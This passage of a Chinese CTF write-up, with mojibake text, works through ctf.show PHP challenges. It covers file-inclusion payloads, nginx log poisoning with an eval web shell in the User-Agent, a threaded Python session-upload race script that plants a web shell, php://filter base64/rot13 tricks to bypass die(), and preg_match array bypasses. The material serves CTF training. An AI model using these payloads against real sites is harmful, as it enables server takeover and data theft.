class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">die</span>();</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">c=<span class="variable">$d</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*&quot;</span>;<span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;&#125;<span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>ç„¶åinclude</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢˜çš„uafä»£ç ä¸­strlenè¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªä»£æ›¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$ret</span>=<span class="variable">$ret</span>+<span class="number">1</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</span></h3><ul><li><p>nginxæ—¥å¿—çš„é»˜è®¤è·¯å¾„ä¸º&#x2F;var&#x2F;log&#x2F;nginx.</p></li><li><p>sshæ—¥å¿—çš„é»˜è®¤è·¯å¾„ä¸º&#x2F;var&#x2F;log&#x2F;auth.log</p></li><li><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">filterå¦™ç”¨</a></p></li><li><p><a href="https://xz.aliyun.com/t/8163"><strong>file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</strong></a></p></li></ul><h4><span id="web80">web80</span></h4><ul><li>å¦‚æœè¿‡æ»¤äº†<code>php</code>å¯ä»¥ç”¨PHPæ¥ç»•è¿‡ï¼Œä½†æ˜¯<code>data</code>ä¸èƒ½ç”¨DATAæ¥ç»•è¿‡</li><li><strong>php:&#x2F;&#x2F;input</strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</li><li>åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œæ—¥å¿—æ³¨å…¥ï¼Œåˆ¤æ–­çš„æ¡ä»¶æ˜¯æ˜¯å¦å¯ä»¥è¿›è¡Œ<a href="https://so.csdn.net/so/search?q=ssrf%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">ssrfæ¼æ´</a>,ä¼ å‚&#x2F;etc&#x2F;passwdï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™ä»£è¡¨å¯ä»¥è¿›è¡Œæ—¥å¿—æ³¨å…¥</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€ï¼šPhpç»•è¿‡</p><p>ä½¿ç”¨burpsuit</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7c1020fb-ad70-446e-aa9f-96f37da1dd90.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fl0g.php&#x27;</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šæ—¥å¿—æ³¨å…¥</p><ul><li><p>Getä¼ å‚<code>/?file=/var/log/nginx/access.log</code>ï¼Œæ‰¾åˆ°æ—¥å¿—åœ°å€ï¼ˆä¸€ä¸ªä¸ªå¸¸ç”¨åœ°å€è¯•è¯•çœ‹ï¼‰</p></li><li><p>ç„¶ååœ¨UAé‡Œé¢è—å…¥ä¸€å¥è¯æœ¨é©¬ <?php eval($_POST['shell']); ?></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7c1020fb-ad70-446e-aa9f-96f37da1dd90.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php eval($_POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ğŸœğŸ—¡è¿æ¥</p><ul><li><a href="http://f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show/?file=/var/log/nginx/access.log">http://f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show/?file=/var/log/nginx/access.log</a></li><li>å¯†ç :a</li></ul></li><li><p>æˆ–è€…ç›´æ¥åœ¨UAé‡Œé¢æ‰§è¡Œä»£ç å°±è¡Œäº†ï¼Œ<strong>æ³¨æ„åˆ«è¾“é”™äº†ï¼Œå¦åˆ™éœ€è¦é‡å¯å®ä¾‹</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system(&#x27;tac fl0g.php&#x27;); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4><span id="web83">web83</span></h4><ul><li>å› ä¸ºè¿‡æ»¤äº†ç‚¹æ‰€ä»¥åº”è¯¥æ˜¯æ— åç¼€å½¢å¼çš„ï¼Œ<a href="https://xz.aliyun.com/t/10662"><strong>è€Œphpä¸­æˆ‘ä»¬å”¯ä¸€èƒ½æ§åˆ¶çš„æ— åç¼€çš„å°±æ˜¯sessionæ–‡ä»¶</strong></a></li><li><a href="https://www.freebuf.com/articles/web/275557.html">æ¡ä»¶ç«äº‰</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/jiuzhen.php&#x27;,&#x27;&lt;?php eval($_POST[3]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#è¿™ä¸ªæ˜¯è®¿é—®/tmp/sess_ctfshowæ—¶ï¼Œpostä¼ é€’çš„å†…å®¹ï¼Œæ˜¯åœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚è¿™æ ·ä¸€æ—¦è®¿é—®æˆåŠŸï¼Œå°±å¯ä»¥èšå‰‘è¿æ¥äº†ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):<span class="comment">#/tmp/sess_ctfshowä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</span></span><br><span class="line">fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">response=session.post(url,</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">&#125;,</span><br><span class="line">files=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):<span class="comment">#è®¿é—®/tmp/sess_ctfshowï¼Œpostä¼ é€’ä¿¡æ¯ï¼Œåœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥æœ¨é©¬ã€‚</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">resposne2=session.get(url+<span class="string">&#x27;jiuzhen.php&#x27;</span>);<span class="comment">#è®¿é—®æœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœè®¿é—®åˆ°äº†å°±ä»£è¡¨ç«äº‰æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:äº†</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">evnet=threading.Event()</span><br><span class="line"><span class="comment">#å†™å…¥å’Œè®¿é—®åˆ†åˆ«è®¾ç½®5ä¸ªçº¿ç¨‹ã€‚</span></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="web87">web87</span></h4><ul><li>æäº¤çš„æ–¹å¼è¦ä½¿ç”¨<code>Content-Type: application/x-www-form-urlencoded</code>ï¼Œå¦åˆ™æ— æ³•æˆåŠŸï¼Œè¿™ç§é¢˜å…¶å®å¯ä»¥ç”¨POSTManåšï¼Œæ²¡å¿…è¦ç”¨burpsuiteæŠ“åŒ…ï¼Œå¦‚æœè¦æŠ“ï¼Œå¿…é¡»å¸¦ä¸Šä¸Šé¢è¿™å¥Content-type</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜éœ€è¦ç»•è¿‡dieå‡½æ•°ï¼Œæˆ‘ä»¬è¦ä½¿å…¶æ— æ•ˆï¼Œå¦åˆ™å½±å“æˆ‘ä»¬æäº¤çš„å†…å®¹ã€‚</p><p>æ€è·¯å¯ä»¥å‚è€ƒ[æ–‡ä»¶åŒ…å«](# æ–‡ä»¶åŒ…å«)åº•ä¸‹çš„é“¾æ¥</p><ul><li><p>æ–¹æ³•ä¸€ï¼šç”¨base64 ç¼–ç <br>ä½¿ç”¨urlç¼–ç <code>file=php://filter/write=convert.base64-decode/resource=flag.php</code>ï¼Œ</p><p>éœ€è¦æŠŠå­—æ¯ä¹Ÿç¼–ç ï¼Œç„¶åå†è¿›è¡Œä¸€æ¬¡urlç¼–ç </p><p><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2566%256c%2561%2567%252e%2570%2568%2570</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encodeAllStrings</span>(<span class="params">strings</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%&#123;0:0&gt;2&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&quot;x&quot;</span>)) <span class="keyword">for</span> char <span class="keyword">in</span> strings)</span><br><span class="line">  r = encodeAllStrings(a)</span><br><span class="line">  parse.quote(r)</span><br></pre></td></tr></table></figure><blockquote><p>contentæ˜¯å†™å…¥å†…å®¹,è¦è¿›è¡Œbase64ç¼–ç  å¯¹åº”ä¸Šé¢çš„ä¼ªåè®®è§£ç ,è€Œbaseè§£ç æ—¶,æ˜¯4ä¸ªä¸€ç»„,flag.php(è¦å†™å…¥çš„æ–‡ä»¶),å†™å…¥çš„å†…å®¹<code>&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;</code>ä¸­åªæœ‰phpdieä¼šå‚ä¸base64è§£ç ,å› ä¸ºphpdieåªæœ‰6ä¸ªå­—èŠ‚,è¡¥ä¸¤ä¸ªaå°±æ˜¯8å­—èŠ‚äº†,åœ¨base64è§£å¯†æ—¶ä¼šå¿½ç•¥ä¸å¯è¯†åˆ«çš„å­—ç¬¦</p><p>æ€»ç»“:æˆ‘ä»¬è¦åœ¨contentä¸­å†™å…¥shell,ç„¶åbase64ç¼–ç <br><code>content=&lt;?php system(&#39;ls&#39;);?&gt;</code><br>base64<br><code>content=PD9waHAgc3lzdGVtKCdscycpOz8+</code></p><p>æˆ‘ä»¬è¿˜è¦åœ¨base64å‰åŠ ä¸Šä¸¤ä¸ªå­—ç¬¦æ¥å‡‘é½ä½æ•°ï¼Œå› æ­¤contentå˜æˆäº†</p><p><code>content=aaPD9waHAgc3lzdGVtKCdscycpOz8+</code></p></blockquote><p><strong>BASE64åŠ å¯†éœ€è¦4çš„æ•´æ•°å€</strong></p></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨rot13åŠ å¯†</p><p>åŒç†ï¼Œå…ˆæ„é€ rot13åŠ å¯†çš„ä¼ªåè®®<code>php://filter/write=string.rot13/resource=2.php</code></p><p>ç„¶åä¸¤æ¬¡urlåŠ å¯†</p><p><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570</code></p><p>ç„¶åpayloadï¼Œ<code>&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>ä½¿ç”¨rot13åŠ å¯†<code>&lt;?cuc flfgrz(&#39;gnp sy0t.cuc&#39;)?&gt;</code></p></li></ul><h3><span id="phpç‰¹æ€§">phpç‰¹æ€§</span></h3><h4><span id="web89">web89</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>preg_matchæœ‰ä¸ªæ¼æ´ï¼Œå½“æ£€æµ‹çš„å˜é‡æ˜¯æ•°ç»„çš„æ—¶å€™ä¼šæŠ¥é”™å¹¶è¿”å›0ã€‚è€Œintvalå‡½æ•°å½“ä¼ å…¥çš„å˜é‡ä¹Ÿæ˜¯æ•°ç»„çš„æ—¶å€™ï¼Œä¼šè¿”å›1ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ ä¸ªæ•°ç»„ç»•è¿‡ï¼Œæ„é€ payload</p><p><code>?num[]=abc</code></p></li></ul><h4><span id="web90">web90</span></h4><p>intval($num,0)æ„æ€æ˜¯æ£€æµ‹numçš„è¿›åˆ¶ç±»å‹å¹¶è¿”å›å…¶åè¿›åˆ¶çš„å€¼ï¼Œè‹¥numå‰ç¼€ä¸º0ï¼Œå³åˆ¤æ–­numä¸ºå…«è¿›åˆ¶ï¼Œè‹¥numå‰ç¼€ä¸º0xï¼Œåˆ™åˆ¤æ–­numä¸ºåå…­è¿›åˆ¶</p><ul><li>phpä¸­**&#x3D;&#x3D;&#x3D;**<ul><li>å€¼ç›¸ç­‰</li><li>ç±»å‹ç›¸åŒ</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span 